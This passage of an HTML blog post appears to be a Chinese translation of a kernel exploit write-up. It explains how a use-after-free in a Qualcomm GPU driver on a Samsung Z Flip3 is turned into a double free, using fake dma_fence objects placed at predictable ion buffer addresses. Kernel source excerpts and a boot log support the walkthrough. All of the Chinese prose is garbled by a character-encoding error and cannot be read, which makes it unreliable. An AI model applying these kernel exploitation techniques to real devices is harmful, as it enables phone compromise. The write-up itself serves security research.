<p>åªå‰©ä¸‹äº†ã€<code>dma_fence_put</code>å‡½æ•°ï¼Œå®ƒå‡å°‘<code>fence</code>çš„<code>refcount</code>ï¼Œå¹¶åœ¨<code>refcount</code>è¾¾åˆ°0æ—¶è°ƒç”¨<code>dma_fence_release</code>ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">dma_fence_release</span><span class="params">(<span class="keyword">struct</span> kref *kref)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (fence-&gt;ops-&gt;release)</span><br><span class="line">        fence-&gt;ops-&gt;release(fence);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        dma_fence_free(fence);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœè°ƒç”¨<code>dma_fence_release</code>ï¼Œé‚£ä¹ˆæœ€ç»ˆä¼šæ£€æŸ¥<code>fence-&gt;ops</code>å¹¶è°ƒç”¨<code>fence-&gt;ops-&gt;release</code>ã€‚è¿™å°±æœ‰ä¸¤ä¸ªé—®é¢˜ã€‚é¦–å…ˆï¼Œ<code>fence-&gt;ops</code>éœ€è¦æŒ‡å‘æœ‰æ•ˆçš„å†…å­˜ï¼Œå¦åˆ™è§£é™¤å¼•ç”¨å°±ä¼šå¤±è´¥ï¼Œå³ä½¿è§£é™¤å¼•ç”¨æˆåŠŸï¼Œ<code>fence-&gt;ops-&gt;release</code>è¦ä¹ˆéœ€è¦ä¸ºé›¶ï¼Œè¦ä¹ˆå¿…é¡»æ˜¯ä¸€ä¸ªé€‚å½“ç±»å‹çš„å‡½æ•°çš„åœ°å€ã€‚</p>
<p>æ‰€æœ‰è¿™äº›ç»™äº†ä¸¤ä¸ªé€‰æ‹©ã€‚å¯ä»¥éµå¾ªæ ‡å‡†è·¯å¾„ï¼šå°è¯•ç”¨å¦ä¸€ä¸ªå¯¹è±¡æ›¿æ¢æ …æ å¯¹è±¡ï¼Œæˆ–è€…å°è¯•åˆ©ç”¨<code>dma_fence_put</code>å’Œ<code>dma_fence_set_error</code>æä¾›çš„æœ‰é™çš„å†™åŸè¯­ï¼ŒåŒæ—¶å¸Œæœ›ä»ç„¶å¯ä»¥æ§åˆ¶<code>flags</code>å’Œ<code>refcount</code>å­—æ®µä»¥é¿å…<code>dma_fence_signal_locked</code>æˆ–<code>dma_fence_release</code>ä½¿å†…æ ¸å´©æºƒã€‚</p>
<h2 id="The-ultimate-fake-object-store"><a href="#The-ultimate-fake-object-store" class="headerlink" title="The ultimate fake object store"></a>The ultimate fake object store</h2><p>åœ¨åˆ©ç”¨å¦ä¸€ä¸ª<a target="_blank" rel="noopener" href="https://securitylab.github.com/research/one_day_short_of_a_fullchain_android/">é”™è¯¯</a>æ—¶ï¼Œä½œè€…å‘ç°äº†è½¯ä»¶è¾“å…¥è¾“å‡ºè½¬æ¢æ—è§‚ç¼“å†²åŒºï¼ˆ<code>SWIOTLB</code>ï¼‰ï¼Œè¿™æ˜¯ä¸€ä¸ªåœ¨å¯åŠ¨æ—¶å¾ˆæ—©å°±åˆ†é…çš„å†…å­˜åŒºåŸŸã€‚å› æ­¤ï¼Œ<code>SWIOTLB</code>çš„ç‰©ç†åœ°å€æ˜¯éå¸¸å›ºå®šçš„ï¼Œåªå–å†³äºç¡¬ä»¶é…ç½®ã€‚æ­¤å¤–ï¼Œç”±äºè¯¥å†…å­˜ä½äº â€œä½å†…å­˜ â€œåŒºåŸŸï¼ˆAndroidè®¾å¤‡ä¼¼ä¹æ²¡æœ‰ â€œé«˜å†…å­˜ â€œåŒºåŸŸï¼‰ï¼Œå¹¶ä¸”ä¸åœ¨å†…æ ¸é•œåƒä¸­ï¼Œå› æ­¤è™šæ‹Ÿåœ°å€åªæ˜¯å¸¦æœ‰å›ºå®šåç§»çš„ç‰©ç†åœ°å€ï¼ˆå¯¹ç»†èŠ‚æ„Ÿå…´è¶£çš„è¯»è€…å¯ä»¥å…³æ³¨<code>kmap</code>å‡½æ•°çš„å®ç°ï¼‰:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __virt_to_phys_nodebug(x) (&#123;                   \</span></span><br><span class="line"><span class="meta">    phys_addr_t __x = (phys_addr_t)(__tag_reset(x));        \</span></span><br><span class="line"><span class="meta">    __is_lm_address(__x) ? __lm_to_phys(__x) : __kimg_to_phys(__x); \</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __is_lm_address(addr)  (!(((u64)addr) &amp; BIT(vabits_actual - 1)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __lm_to_phys(addr) (((addr) + physvirt_offset))</span></span><br></pre></td></tr></table></figure>

<p>ä¸Šè¿°å®šä¹‰æ¥è‡ª<a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/arch/arm64/include/asm/memory.h"><code>arch/arm64/include/asm/memory.h</code></a>ï¼Œå®ƒæ˜¯Androidçš„ç›¸å…³å®ç°ã€‚ç”¨äºç¿»è¯‘åœ°å€çš„å˜é‡<code>physvirt_offset</code>æ˜¯åœ¨<a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/arch/arm64/mm/init.c#L517"><code>arm64_memblock_init</code></a>ä¸­è®¾ç½®çš„ä¸€ä¸ªå›ºå®šå¸¸æ•°ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __init <span class="title function_">arm64_memblock_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;...</span><br><span class="line">    memstart_addr = round_down(memblock_start_of_DRAM(),</span><br><span class="line">                   ARM64_MEMSTART_ALIGN);</span><br><span class="line">    physvirt_offset = PHYS_OFFSET - PAGE_OFFSET;</span><br><span class="line"></span><br><span class="line"> ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é™¤æ­¤ä¹‹å¤–ï¼Œ<code>SWIOTLB</code>ä¸­çš„å†…å­˜å¯ä»¥é€šè¿‡<code>adsp</code>é©±åŠ¨è®¿é—®ï¼Œè€Œ<code>adsp</code>é©±åŠ¨æ˜¯å¯ä»¥ä»ä¸€ä¸ªä¸å—ä¿¡ä»»çš„åº”ç”¨ç¨‹åºä¸­åˆ°è¾¾çš„ï¼Œæ‰€ä»¥è¿™ä¼¼ä¹æ˜¯ä¸€ä¸ªå­˜å‚¨å‡å¯¹è±¡å’Œé‡å®šå‘å‡æŒ‡é’ˆçš„å¥½åœ°æ–¹ã€‚ç„¶è€Œï¼Œåœ¨5.xç‰ˆæœ¬çš„å†…æ ¸ä¸­ï¼Œ<code>SWIOTLB</code>åªæœ‰åœ¨ç”¨<code>CONFIG_DMA_ZONE32</code>æ ‡å¿—ç¼–è¯‘å†…æ ¸æ—¶æ‰ä¼šè¢«åˆ†é…ï¼Œè€ŒZ Flip3 ä¸æ˜¯è¿™ç§æƒ…å†µã€‚</p>
<p>ç„¶è€Œï¼Œè¿˜æœ‰æ›´å¥½çš„ä¸œè¥¿ã€‚<code>SWIOTLB</code>çš„æ—©æœŸåˆ†é…ç»™äº†å®ƒä¸€ä¸ªå¯é¢„æµ‹çš„åœ°å€ï¼Œè¿™ä¿ƒä½¿ä½œè€…æ£€æŸ¥å¯åŠ¨æ—¥å¿—ï¼Œçœ‹çœ‹æ˜¯å¦æœ‰å…¶ä»–çš„å†…å­˜åŒºåŸŸåœ¨å¯åŠ¨è¿‡ç¨‹ä¸­è¢«æå‰åˆ†é…ï¼Œç»“æœå‘ç°ç¡®å®æœ‰å…¶ä»–çš„å†…å­˜åŒºåŸŸåœ¨å¯åŠ¨è¿‡ç¨‹ä¸­è¢«å¾ˆæ—©åœ°åˆ†é…ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;6&gt;[    0.000000] [0:        swapper:    0]  Reserved memory: created CMA memory pool at 0x00000000f2800000, size 212 MiB</span><br><span class="line">&lt;6&gt;[    0.000000] [0:        swapper:    0]  OF: reserved mem: initialized node secure_display_region, compatible <span class="built_in">id</span> shared-dma-pool</span><br><span class="line">...</span><br><span class="line">&lt;6&gt;[    0.000000] [0:        swapper:    0]  OF: reserved mem: initialized node user_contig_region, compatible <span class="built_in">id</span> shared-dma-pool</span><br><span class="line">&lt;6&gt;[    0.000000] [0:        swapper:    0]  Reserved memory: created CMA memory pool at 0x00000000f0c00000, size 12 MiB</span><br><span class="line"></span><br><span class="line">&lt;6&gt;[    0.578613] [7:      swapper/0:    1]  platform soc:qcom,ion:qcom,ion-heap@22: assigned reserved memory node sdsp_region</span><br><span class="line">...</span><br><span class="line">&lt;6&gt;[    0.578829] [7:      swapper/0:    1]  platform soc:qcom,ion:qcom,ion-heap@26: assigned reserved memory node user_contig_region</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„ä¿ç•™å†…å­˜åŒºåŸŸä¼¼ä¹æ˜¯ç”¨äºåˆ†é…<code>ion</code>ç¼“å†²åŒºçš„å†…å­˜æ± ã€‚</p>
<p>åœ¨Androidä¸Šï¼Œ<code>ion_allocator</code>è¢«ç”¨æ¥åˆ†é…ç”¨äº<code>DMA</code>ï¼ˆç›´æ¥å†…å­˜è®¿é—®ï¼‰çš„å†…å­˜åŒºåŸŸï¼Œå…è®¸å†…æ ¸é©±åŠ¨å’Œç”¨æˆ·ç©ºé—´è¿›ç¨‹å…±äº«åŒä¸€åº•å±‚å†…å­˜ã€‚æœªå—ä¿¡ä»»çš„åº”ç”¨ç¨‹åºå¯ä»¥é€šè¿‡<code>/dev/ion</code>æ–‡ä»¶è®¿é—®<code>ion</code>åˆ†é…å™¨ï¼Œ<code>ION_IOC_ALLOC</code> <code>ioctl</code>å¯ä»¥ç”¨æ¥åˆ†é…ä¸€ä¸ª<code>ion</code>ç¼“å†²åŒºã€‚è¯¥<code>ioctl</code>å‘ç”¨æˆ·è¿”å›ä¸€ä¸ªæ–°çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œç„¶åå¯ä»¥åœ¨<code>mmap syscall</code>ä¸­ä½¿ç”¨ï¼Œå°†<code>ion</code>ç¼“å†²åŒºçš„åå¤‡å­˜å‚¨æ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´ã€‚</p>
<p>ä½¿ç”¨<code>ion</code>ç¼“å†²åŒºçš„ä¸€ä¸ªç‰¹æ®ŠåŸå› æ˜¯ï¼Œç”¨æˆ·å¯ä»¥è¯·æ±‚å…·æœ‰è¿ç»­ç‰©ç†åœ°å€çš„å†…å­˜ã€‚è¿™ä¸€ç‚¹ç‰¹åˆ«é‡è¦ï¼Œå› ä¸ºæœ‰äº›è®¾å¤‡ï¼ˆå¦‚ç¡¬ä»¶ä¸Šçš„è®¾å¤‡ï¼Œè€Œä¸æ˜¯æ‰‹æœºæœ¬èº«ï¼‰ç›´æ¥è®¿é—®ç‰©ç†å†…å­˜ï¼Œæ‹¥æœ‰è¿ç»­çš„å†…å­˜åœ°å€å¯ä»¥å¤§å¤§æ”¹å–„è¿™ç§å†…å­˜è®¿é—®çš„æ€§èƒ½ï¼Œè€Œæœ‰äº›è®¾å¤‡ä¸èƒ½å¤„ç†éè¿ç»­çš„ç‰©ç†å†…å­˜ã€‚</p>
<p>ä¸<code>SWIOTLB</code>ç±»ä¼¼ï¼Œä¸ºäº†ç¡®ä¿å…·æœ‰è¯·æ±‚å¤§å°çš„è¿ç»­ç‰©ç†å†…å­˜åŒºåŸŸå¯ç”¨ï¼Œ<code>ion</code>é©±åŠ¨åœ¨å¯åŠ¨åˆæœŸå°±åˆ†é…äº†è¿™äº›å†…å­˜åŒºåŸŸï¼Œå¹¶å°†å…¶ä½œä¸ºå†…å­˜æ± ï¼ˆâ€åˆ’å‡ºçš„åŒºåŸŸâ€ï¼‰ï¼Œç„¶ååœ¨ä»¥åçš„è¯·æ±‚ä¸­ç”¨äºåˆ†é…<code>ion</code>ç¼“å†²åŒºã€‚å¹¶é<code>ion</code>è®¾å¤‡ä¸­çš„æ‰€æœ‰å†…å­˜æ± éƒ½æ˜¯è¿ç»­çš„å†…å­˜ï¼ˆä¾‹å¦‚ï¼Œé€šç”¨çš„ â€œç³»ç»Ÿå † â€œå¯èƒ½ä¸æ˜¯ç‰©ç†ä¸Šè¿ç»­çš„åŒºåŸŸï¼‰ï¼Œä½†æ˜¯ç”¨æˆ·å¯ä»¥åœ¨ä½¿ç”¨<code>ION_IOC_ALLOC</code>æ—¶æŒ‡å®š<code>heap_id_mask</code>æ¥æŒ‡å®šå…·æœ‰ç‰¹å®šå±æ€§ï¼ˆä¾‹å¦‚ï¼Œè¿ç»­çš„ç‰©ç†å†…å­˜ï¼‰çš„<code>ion</code>å †ã€‚</p>
<p>è¿™äº›å†…å­˜æ± åœ¨å¦‚æ­¤æ—©çš„é˜¶æ®µè¢«åˆ†é…ï¼Œæ„å‘³ç€å®ƒä»¬çš„åœ°å€æ˜¯å¯é¢„æµ‹çš„ï¼Œåªå–å†³äºç¡¬ä»¶çš„é…ç½®ï¼ˆè®¾å¤‡æ ‘ã€å¯ç”¨å†…å­˜ã€å†…å­˜èµ·å§‹åœ°å€ã€å„ç§å¯åŠ¨å‚æ•°ç­‰ï¼‰ã€‚è¿™å°¤å…¶æ„å‘³ç€ï¼Œå¦‚æœä½¿ç”¨<code>ION_IOC_ALLOC</code>ä»ä¸€ä¸ªå¾ˆå°‘ä½¿ç”¨çš„å†…å­˜æ± ä¸­åˆ†é…ä¸€ä¸ª<code>ion</code>ç¼“å†²åŒºï¼Œè¿™ä¸ªç¼“å†²åŒºå¾ˆå¯èƒ½è¢«åˆ†é…åˆ°ä¸€ä¸ªå¯é¢„æµ‹çš„åœ°å€ã€‚å¦‚æœä½¿ç”¨<code>mmap</code>å°†ç¼“å†²åŒºæ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´ï¼Œå°±å¯ä»¥åœ¨ä»»ä½•æ—¶å€™è®¿é—®è¿™ä¸ªå¯é¢„æµ‹åœ°å€çš„å†…å­˜äº†ã€‚</p>
<p>ç»è¿‡ä¸€äº›å®éªŒï¼Œä¼¼ä¹<code>user_contig_region</code>å‡ ä¹ä»æœªè¢«ä½¿ç”¨ï¼Œæ¯æ¬¡éƒ½èƒ½æŠŠæ•´ä¸ªåŒºåŸŸæ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´ã€‚æ‰€ä»¥åœ¨è¿™ä¸ªæ¼æ´ä¸­ï¼Œä½œè€…ä½¿ç”¨äº†è¿™ä¸ªå†…å­˜æ± ï¼Œå¹¶å‡è®¾å¯ä»¥åˆ†é…æ•´ä¸ªåŒºåŸŸä»¥ä¿æŒç®€å•ã€‚(åœ¨ä¸å½±å“å¯é æ€§çš„æƒ…å†µä¸‹ï¼Œä¿®æ”¹æ¼æ´ä»¥é€‚åº”éƒ¨åˆ†åŒºåŸŸä¸å¯ç”¨çš„æƒ…å†µæ˜¯å¾ˆå®¹æ˜“çš„)ã€‚</p>
<p>ç°åœ¨èƒ½å¤ŸæŠŠå—æ§çš„æ•°æ®æ”¾åœ¨ä¸€ä¸ªå¯é¢„æµ‹çš„åœ°å€ä¸Šï¼Œå¯ä»¥è§£å†³ä¹‹å‰åœ¨åˆ©ç”¨ä¸­é‡åˆ°çš„é—®é¢˜ã€‚å›é¡¾ä¸€ä¸‹ï¼Œå½“<code>dma_fence_release</code>åœ¨å‡ <code>fence</code> å¯¹è±¡ä¸Šè¢«è°ƒç”¨æ—¶ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">dma_fence_release</span><span class="params">(<span class="keyword">struct</span> kref *kref)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (fence-&gt;ops-&gt;release)</span><br><span class="line">        fence-&gt;ops-&gt;release(fence);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        dma_fence_free(fence);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œéœ€è¦<code>fence-&gt;ops</code>æŒ‡å‘ä¸€ä¸ªåŒ…å«æ‰€æœ‰é›¶çš„æœ‰æ•ˆåœ°å€ï¼Œè¿™æ ·<code>fence-&gt;ops-&gt;release</code>å°±ä¸ä¼šè¢«è°ƒç”¨ï¼ˆå› ä¸ºåœ¨è¿™ä¸ªé˜¶æ®µæ²¡æœ‰ä¸€ä¸ªæœ‰æ•ˆçš„å‡½æ•°åœ°å€ä¸<code>fence-&gt;ops-&gt;release</code>çš„ç­¾åç›¸åŒ¹é…ï¼Œèµ°è¿™ä¸ªè·¯å¾„ä¼šä½¿å†…æ ¸å´©æºƒï¼‰ã€‚</p>
<p>ç”±äº<code>ion</code>ç¼“å†²åŒºåœ¨ä¸€ä¸ªå¯é¢„æµ‹çš„åœ°å€ä¸Šï¼Œå¯ä»¥ç®€å•åœ°æŠŠå®ƒå¡«ä¸ºé›¶ï¼Œè®©<code>fence-&gt;ops</code>æŒ‡å‘é‚£é‡Œã€‚è¿™å°†ç¡®ä¿<code>dma_fence_free</code>è·¯å¾„è¢«é‡‡å–ï¼Œç„¶åé‡Šæ”¾å‡å¯¹è±¡ï¼Œå½¢æˆä¸€ä¸ª<code>double free</code>çš„åŸå½¢ï¼ŒåŒæ—¶é˜²æ­¢å†…æ ¸å´©æºƒã€‚åœ¨ç»§ç»­åˆ©ç”¨è¿™ä¸ª<code>double free</code>åŸè¯­ä¹‹å‰ï¼Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜éœ€è¦é¦–å…ˆè§£å†³ã€‚</p>
<h2 id="Escaping-an-infinite-loop"><a href="#Escaping-an-infinite-loop" class="headerlink" title="Escaping an infinite loop"></a>Escaping an infinite loop</h2><p>å›é¡¾ä¸€ä¸‹ï¼Œåœ¨<code>kgsl_ioctl_timeline_destroy</code>å‡½æ•°ä¸­ï¼Œåœ¨<code>fence</code>å¯¹è±¡è¢«é”€æ¯å’Œæ›¿æ¢åï¼Œä¼šæ‰§è¡Œä»¥ä¸‹å¾ªç¯ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">spin_lock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">list_for_each_entry_safe(fence, tmp, &amp;temp, node) &#123;</span><br><span class="line">    dma_fence_set_error(&amp;fence-&gt;base, -ENOENT);</span><br><span class="line">    dma_fence_signal_locked(&amp;fence-&gt;base);</span><br><span class="line">    dma_fence_put(&amp;fence-&gt;base);</span><br><span class="line">&#125;</span><br><span class="line">spin_unlock_irq(&amp;timeline-&gt;lock);</span><br></pre></td></tr></table></figure>

<p><code>list_for_each_entry_safe</code> å°†é¦–å…ˆä» <code>list_head</code> <code>temp</code> ä¸­è·å–ä¸‹ä¸€ä¸ªæŒ‡é’ˆï¼Œæ‰¾åˆ°åˆ—è¡¨ä¸­çš„ç¬¬ä¸€ä¸ª<code>fence</code>æ¡ç›®ï¼Œç„¶åé€šè¿‡è·Ÿè¸ª <code>fence-&gt;node</code> ä¸­çš„ä¸‹ä¸€ä¸ªæŒ‡é’ˆè¿›è¡Œè¿­ä»£ï¼Œç›´åˆ°ä¸‹ä¸€ä¸ªæ¡ç›®å†æ¬¡æŒ‡å‘ <code>temp</code>ã€‚å¦‚æœä¸‹ä¸€ä¸ªæ¡ç›®æ²¡æœ‰æŒ‡å‘<code>temp</code>ï¼Œé‚£ä¹ˆè¿™ä¸ªå¾ªç¯å°±ä¼šç»§ç»­ã€‚è¿™æ˜¯ä¸€ä¸ªå˜é‡åˆå§‹åŒ–ä½¿åˆ©ç”¨æ›´åŠ å›°éš¾çš„åœ°æ–¹ã€‚çœ‹çœ‹<code>kgsl_timeline_fence</code>çš„ç»“æ„ï¼Œå®ƒåµŒå…¥äº†ä¸€ä¸ª<code>dma_fence</code>å¯¹è±¡ï¼Œè¢«æ·»åŠ åˆ°<code>kgsl_timeline</code>ä¸­ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kgsl_timeline_fence</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dma_fence</span> <span class="title">base</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kgsl_timeline</span> *<span class="title">timeline</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">node</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°<code>node</code>å­—æ®µæ˜¯<code>kgsl_timeline_fence</code>ä¸­çš„æœ€åä¸€ä¸ªå­—æ®µï¼Œè€Œä¸ºäº†æ„å»ºè¿™ä¸ªæ¼æ´ï¼Œåªéœ€è¦ç”¨å—æ§æ•°æ®æ›¿æ¢<code>base</code>ã€‚å¦‚æœç”¨éƒ¨åˆ†å¯¹è±¡æ›¿æ¢ï¼Œä¸Šè¿°é—®é¢˜å°±ä¼šå¾ˆå®¹æ˜“è§£å†³äº†ã€‚åœ¨æ²¡æœ‰è‡ªåŠ¨å˜é‡åˆå§‹åŒ–çš„æƒ…å†µä¸‹ï¼Œå¦‚æœåªå°†é‡Šæ”¾çš„<code>kgsl_timeline_fence</code>æ›¿æ¢æˆä¸€ä¸ª<code>dma_fence</code>å¤§å°çš„å¯¹è±¡ï¼Œé‚£ä¹ˆå­—æ®µ<code>timeline</code>å’Œ<code>node</code>å°†ä¿æŒä¸å˜ï¼Œå¹¶åŒ…å«æœ‰æ•ˆæ•°æ®ã€‚è¿™å°†å¯¼è‡´<code>node</code>ä¸­çš„ä¸‹ä¸€ä¸ªæŒ‡é’ˆæœ‰æ•ˆï¼Œå¹¶å…è®¸<code>kgsl_ioctl_timeline_destroy</code>çš„å¾ªç¯æ­£å¸¸é€€å‡ºã€‚ç„¶è€Œï¼Œåœ¨è‡ªåŠ¨å˜é‡åˆå§‹åŒ–çš„æƒ…å†µä¸‹ï¼Œå³ä½¿æŠŠé‡Šæ”¾çš„<code>kgsl_timeline_fence</code>å¯¹è±¡æ¢æˆä¸€ä¸ªæ›´å°çš„å¯¹è±¡ï¼Œæ•´ä¸ªå†…å­˜å—ä¹Ÿä¼šé¦–å…ˆè¢«è®¾ç½®ä¸ºé›¶ï¼ŒæŠ¹å»<code>kgsl_timeline</code>å’Œ<code>node</code>ï¼Œè¿™æ„å‘³ç€å¿…é¡»ä¼ªé€ <code>node</code>å­—æ®µï¼Œä»¥ä¾¿ï¼š</p>
<ol>
<li>ä¸‹ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘ä¸€ä¸ªæœ‰æ•ˆçš„åœ°å€ï¼Œä»¥é¿å…ç«‹å³å´©æºƒï¼Œäº‹å®ä¸Šï¼Œä¸æ­¢å¦‚æ­¤ï¼Œå®ƒéœ€è¦æŒ‡å‘ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡æ˜¯å¦ä¸€ä¸ªå‡çš„<code>kgsl_timeline_fence</code>ï¼Œå¯ä»¥è¢«å¾ªç¯ä¸­çš„å‡½æ•°ï¼ˆ<code>dma_fence_set_error</code>ã€<code>dma_fence_signal_locked</code>å’Œ<code>dma_fence_put</code>ï¼‰æ“ä½œè€Œä¸å´©æºƒã€‚è¿™æ„å‘³ç€éœ€è¦åˆ¶ä½œæ›´å¤šçš„å‡å¯¹è±¡ã€‚</li>
<li>è¿™äº›å‡çš„<code>kgsl_timeline_fence</code>å¯¹è±¡ä¸­çš„ä¸€ä¸ªä¸‹ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘äº†é€€å‡ºå¾ªç¯çš„<code>temp</code>åˆ—è¡¨ï¼Œè¿™æ˜¯ä¸€ä¸ªå †æ ˆåˆ†é…çš„å˜é‡ã€‚</li>
</ol>
<p>ç¬¬ä¸€ä¸ªè¦æ±‚å¹¶ä¸éš¾ï¼Œå› ä¸ºç°åœ¨å¯ä»¥ä½¿ç”¨<code>ion</code>ç¼“å†²å™¨æ¥åˆ›å»ºè¿™äº›å‡çš„<code>kgsl_timeline_fence</code>å¯¹è±¡ã€‚ç„¶è€Œï¼Œç¬¬äºŒä¸ªè¦æ±‚åˆ™è¦éš¾å¾—å¤šï¼š</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/Kernel-4.webp" alt="Kernel-4"></p>
<p>è¿™å°†å¯¼è‡´ä¸€ä¸ªæ— é™å¾ªç¯ï¼Œå¹¶è€½è¯¯CPUã€‚è™½ç„¶å®ƒå¾ˆéš¾çœ‹ï¼Œä½†å‡çš„å¯¹è±¡åº”è¯¥èƒ½è§£å†³å–æ¶ˆå¼•ç”¨çš„é—®é¢˜å¹¶é¿å…å´©æºƒï¼Œæ‰€ä»¥å®ƒå¯èƒ½ä¸æ˜¯ä¸€ä¸ªè‡´å‘½çš„é—®é¢˜ã€‚ä¸å¹¸çš„æ˜¯ï¼Œç”±äºè¯¥å¾ªç¯åœ¨è‡ªæ—‹é”å†…è¿è¡Œï¼Œåœ¨è¿è¡Œäº†ä¸€å°æ®µæ—¶é—´åï¼Œçœ‹é—¨ç‹—ä¼¼ä¹ä¼šå°†å…¶æ ‡è®°ä¸ºå ç”¨CPUçš„é—®é¢˜å¹¶è§¦å‘å†…æ ¸ææ…Œã€‚æ‰€ä»¥ï¼Œéœ€è¦æ‰¾åˆ°ä¸€ç§æ–¹æ³•æ¥é€€å‡ºå¾ªç¯ï¼Œè€Œä¸”æ˜¯å¿«é€Ÿé€€å‡ºã€‚</p>
<p>çœ‹çœ‹å‡½æ•°<code>dma_fence_signal_locked</code>ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">dma_fence_signal_locked</span><span class="params">(<span class="keyword">struct</span> dma_fence *fence)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">cb_list</span>;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">/* Stash the cb_list before replacing it with the timestamp */</span></span><br><span class="line">    list_replace(&amp;fence-&gt;cb_list, &amp;cb_list);             <span class="comment">//&lt;-- 1.</span></span><br><span class="line">    ...</span><br><span class="line">    list_for_each_entry_safe(cur, tmp, &amp;cb_list, node) &#123; <span class="comment">//&lt;-- 2.</span></span><br><span class="line">        INIT_LIST_HEAD(&amp;cur-&gt;node);</span><br><span class="line">        cur-&gt;func(fence, cur);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå‡½æ•°å°†å¯¹åˆ—è¡¨<code>temp</code>ä¸­çš„æ¯ä¸ªå‡<code>dma_fence</code>ï¼ˆåŸå§‹å·²é‡Šæ”¾çš„å’Œæ›¿æ¢çš„<code>dma_fence</code>ï¼ŒåŠ ä¸Šå®ƒåœ¨<code>ion buffer</code>ä¸­é“¾æ¥çš„é‚£äº›ï¼‰è¿è¡Œã€‚å¦‚å‰æ‰€è¿°ï¼Œå¦‚æœè¿è¡Œä¸Šé¢2å¤„çš„ä»£ç ï¼Œé‚£ä¹ˆå†…æ ¸å¯èƒ½ä¼šå´©æºƒï¼Œå› ä¸ºä¸èƒ½æä¾›ä¸€ä¸ªæœ‰æ•ˆçš„<code>func</code>ï¼Œæ‰€ä»¥è¿˜æ˜¯é¿å…è¿è¡Œè¿™ä¸ªè·¯å¾„ã€‚</p>
